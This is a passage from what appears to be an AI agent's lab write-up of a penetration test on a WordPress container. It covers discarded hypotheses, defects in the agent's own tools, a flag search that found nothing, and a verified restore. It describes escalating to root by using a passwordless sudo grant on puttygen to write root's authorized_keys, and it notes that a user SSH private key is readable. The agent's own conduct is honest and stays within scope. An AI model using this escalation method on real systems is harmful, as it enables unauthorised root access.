| Anything past `root` — kernel exploits, container escape, adjacent containers | 0 attempts | Out of scope for this engagement and for the lab's stated objective. |
| MariaDB from outside the host | 0 attempts | Measured bound to `127.0.0.1:3306`; no pivot into loopback was available without RCE. |

### Discarded with reason

| Hypothesis | Discarded because |
|---|---|
| "The directory `wordpress/` inside the docroot is a second WordPress install." | Measured: `find /var/www/html/wordpress -type f \| wc -l` → **0 files**; `/wordpress/wp-includes/version.php` → `404`. It is an empty directory, indexed by `Options Indexes`. Discarded on 2 independent measurements. |
| "`wp-config.php` ships placeholder salts, therefore the auth cookie is forgeable." | Refuted by measurement. `wp_salt('auth')` returns a 128-character value built from two 64-character `wp_options` rows; the 27-character placeholder is skipped by `pluggable.php:2442`/`:2477`. This is the corpus's own retracted finding (`self-corrections.md` §21). |
| "The SiteEditor AJAX surface is unauthenticated." | Every one of the 16 registered `wp_ajax_*` actions routes through `check_ajax_handler()` (`site-editor-manager.class.php:1379`), which requires a session, `edit_theme_options`, and a nonce. 0 `nopriv` actions exist. |
| "`sudo -l` shows `NOPASSWD` on a binary, so the CVE-2019-14287 `--help` bypass applies." | The sudoers line has no wildcard: `curiosito ALL=(root) NOPASSWD: /usr/bin/puttygen`. No argument-splitting bypass is available. The grant is a plain write-primitive problem (Finding 3). |
| "MariaDB on port 3306 is an entry point." | `LISTEN 127.0.0.1:3306` only, cross-checked by 4 instruments. |
| "`www-data` can append to `authorized_keys`." | Measured as `www-data`: `/home/curiosito/.ssh/authorized_keys` is `NOT-writable`. Its mode is `654 curiosito:www-data` — group bits are `5` = `r-x`, not `6`. Reading the mode as "group www-data can write" would have been a wrong mechanism; the same file *is* readable. |
| "The session token in `wp_usermeta` is reusable." | It carries `expiration: 1715678054` — a Unix timestamp that is in the past. Discarded on inspection of the value, not attempted. |

---

## Instrumentation defects

My own instruments, in the order they produced a wrong or empty answer. This is
the section worth reading.

### 1. A Perl path resolver that reported "0 of 54" — three times, without erroring

I wrote a resolver to enumerate every `dirname(__FILE__)`-relative
`require`/`include` in the plugin. It printed:

```
call sites examined: 0
targets present:     0
targets MISSING:     0
```

Three consecutive times, each with `syntax OK`, exit 0, clean output. **It had
found nothing because it looked in the wrong place, and a count of zero is
indistinguishable from "found none".** This is `self-corrections.md` §14 and §19
wearing a different costume: *blank and zero look identical, and a count of zero
is evidence that nothing was tried.*

The actual bug chain, each step a plausible-looking regex that did not do what
I read it as doing:

1. `\b(?:require|require_once)\s*\(` — assumed `require` is always followed by
   `(`. It is not: `require_once dirname( __FILE__ )` has no wrapping
   parenthesis, so the pattern matched nothing at all.
2. `\(([^;]*)\;` — after fixing the above, required a closing `)` before `;`,
   which the argument-less-parenthesis form does not have.
3. Finally `dirname( __FILE__ ) . '/x.php';` — a **shell** path-extraction step
   whose `sed` did not strip the leading quote. It reported **57 targets
   missing** when at most a handful were, and it confidently named
   `/var/www/html/wp-content/plugins/site-editor/includes/app_file.class.php`
   as absent — a file I had listed myself minutes earlier.

**What caught it:** I did not accept the 57. I had just read `ls -la` of that
exact directory in an earlier command, so the tool contradicted an artefact I
already held. That is the §9 discipline — *cross-check the sweep against an
artefact you already fetched* — and it is the only reason the false positive
did not reach the report.

**Fix:** stop parsing PHP with regex. Rewritten with `token_get_all()`, which
tokenises rather than pattern-matches. That version then reported honestly
(`call sites: 54, resolved: 0, unparsed: 54`) and I found the real reason:
`dirname` tokenises as **`T_STRING`**, not `T_DIR` — `T_DIR` is the `__DIR__`
*magic constant*, a different thing with a confusingly similar name. A third
wrong answer, this one structurally correct and still wrong.

**Rule this adds:** *a count of zero from an instrument you wrote today is a
statement about the instrument until proven otherwise.* And the specific PHP
trap: `dirname(...)` is a function call (`T_STRING`); `__DIR__` is a constant
(`T_DIR`). They share three letters and nothing else.

### 2. A recalled exploit mechanism that the artefact refuted in one line

I reached for `sudo puttygen "ssh-rsa AAAA... " -O save-as:~/.ssh/authorized_keys`
— the form quoted in most write-ups of this escalation. The artefact said no:

```
puttygen: unknown output type `save-as:/root/.ssh/authorized_keys'
puttygen exit=1
```

and then, for the `-O public-openssh -o` form with a bare key string:

```
puttygen: unable to load file `ssh-rsa AAAAB3...': No such file or directory
```

The correct mechanism is `-O public-openssh -o <path>` with a **file** as
keyfile argument, because PuTTYgen 0.78 does not accept a bare key string. I
found this by reading `/usr/bin/puttygen --help` **from the image**, not by
recalling it. **Had I filed the finding from memory it would have carried the
wrong mechanism and a proof that does not reproduce** — the same failure class
as `self-corrections.md` §11's `777`-read-as-`664`: the finding survives, the
stated mechanism is wrong, and a wrong mechanism in a report is a wrong report.

### 3. `docker exec` for every permission predicate would have inverted three findings

Every `test -r` / `test -w` in this writeup is executed through
`setpriv --reuid=… --init-groups`, never through `docker exec` (which is root).
Running them as root would have produced:

- `www-data can read /home/curiosito/.ssh/id_rsa` — **true anyway**, so no
  change (and Finding 4 stands).
- `www-data can read /root/.mysql_history` — **true as root, false as
  `www-data`.** A root-run predicate would have filed a credential-leak finding
  against a path `/root`'s own `700` mode already protects. It would have been
  wrong.
- `www-data can write wp-config.php` — true either way, since `www-data` owns it.

One of the three would have been a fabricated finding, and it would have looked
exactly like a real one. That is `self-corrections.md` §2, and the only reason I
caught it is that I had to write `setpriv` down first and then use it everywhere.

### 4. `ls -l` and the `authorized_keys` group

`654 curiosito:www-data` reads at a glance like "www-data can write this". It
cannot: group bits are `5` (`r-x`). The same file **is** readable by
`www-data`. One digit separates "the web server can inject its own SSH key" from
"the web server can read a public key", and those two are different findings
with different remediation. Recorded because the near-miss is the point: an
answer that came out *nearly* right is the one most likely to ship.

### 5. A wrong intermediate conclusion I caught by re-measuring

I first read the salt measurement as "no `auth_key` in `wp_options`, so
`wp_salt()` generated a random value per boot". I then counted the rows instead
of assuming: `SELECT COUNT(*) … WHERE option_name IN ('auth_key', …)` → **8**,
each 64 characters, and `wp_salt('auth')` is *exactly* the concatenation of two
of them. My first conclusion was wrong in a way that would have produced a
*correct-sounding but wrong* security note ("salts rotate per boot, so a DB read
is harmless"). The count was 8, not 0, and it changed the finding.

---

## Reward

**No reward exists on this lab.** The search that established it, with counts:

| Instrument | Scope | Count | Result |
|---|---|---|---|
| `grep -rlF "FLAG{" /` (excluding `/proc`, `/sys`, `/dev`, `/run`) | whole filesystem | **0 files** | no match |
| `grep -rlF "flag{" /` (same exclusions) | whole filesystem | **1 file** | `wp-content/plugins/site-editor/editor/assets/css/siteeditor.min.css` — quoted: `.ui-icon-flag{background-position:-16px -112px}`. A CSS sprite rule. |
| `grep -rlF "FLAG ="` | whole filesystem | **3 files** | `/usr/share/perl/5.36.0/File/Temp.pm` → `$LOCKFLAG = eval {`; `/usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm` (same file); `wp-includes/js/dist/vendor/lodash.js` → `var CLONE_DEEP_FLAG = 1,`. Both are source identifiers. |
| `grep -roE "FLAG\{[^}]*\}" /var/www` | docroot | **0 matches** | no `FLAG{...}` token anywhere |
| `grep -roE "(FLAG\|flag)\{[^}]{0,64}\}" /var/www` | docroot | **1 match** | the same CSS rule |
| `SELECT … FROM wp_posts` (7 rows) / `wp_options` (172 rows) / `wp_users` (1 row) / `wp_comments` (1 row) | database | 181 rows read | no flag-shaped value in any post content, option, user field or comment |
| `find /home/curiosito` + `cat /root/.bash_history` + `cat /root/.mysql_history` | local user material | 5 home entries, 20 history lines | no flag token |

All four non-zero matches were **read**, not dismissed by name. Three of them
are third-party source code containing the letters `flag` in an identifier, and
one is a minified CSS class. None is a reward, and the corpus's rule is the
reason I quoted them: *a report that invents its own reward teaches the reader
nothing about the finding it is attached to.*

The authoritative statement of this property is the `FLAG{}` column of
[`../INDEX.md`](../INDEX.md). I make no claim about my position in any
sequence.

---

## Restore

Recreated from the image, not by undoing edits.

```
$ docker rm -f asucar_container && docker run -d --name asucar_container asucar:latest
```

Verified **positively** — every check is an assertion of a value I know should
be there, not an absence:

| Check | Expected | Observed |
|---|---|---|
| `grep "wp_version = " wp-includes/version.php` | `6.5.3` | `19:$wp_version = '6.5.3';` |
| `SELECT user_login FROM wp_users` | only the shipped user | 1 row: `wordpress` — the `poscontrol` account I created for the positive control is gone |
| `[ -f /root/.ssh/authorized_keys ]` | absent | `NO`; `ls -A /root/.ssh \| wc -l` → `0` |
| `/tmp` contents | empty | `0` entries; all five probe scripts and the marker key gone |
| `ls -A /home/curiosito` | shipped 5 entries | `.bash_history .bashrc .bash_logout .profile .ssh` — `lab112_key.pub` gone |
| `ls -A .../options-engine/includes/dependency/ \| wc -l` | `1` | `1` — the shipped defect is still there, as it should be |
| `GET /` | 200 | **200, 96154 bytes** — byte-identical to the pre-engagement baseline |
| `POST /wp-login.php` | 200 | **200, 7907 bytes** — byte-identical to the pre-engagement baseline |
| `POST /xmlrpc.php` (known-bad credentials) | the same single fault string | `200`, 414 bytes, `Nombre de usuario o contraseña incorrectos.` |

The two HTTP byte counts matching their pre-engagement values is the useful part:
the restore is verified by a value that had to be *right*, not by the absence of
an error. The lab is back to shipped state, and the only thing left running is
the container the engagement was given.

**Disk.** No image, archive or scratch file was removed beyond my own. The
`asucar:latest` image and `labs/112/` are left in place for the parent to
reclaim by name, alongside `dist/asucar.zip` which is needed for any retry. No
`docker system prune`, no `image prune -a`, no `volume prune` was run, and no
container other than `asucar_container` was touched.
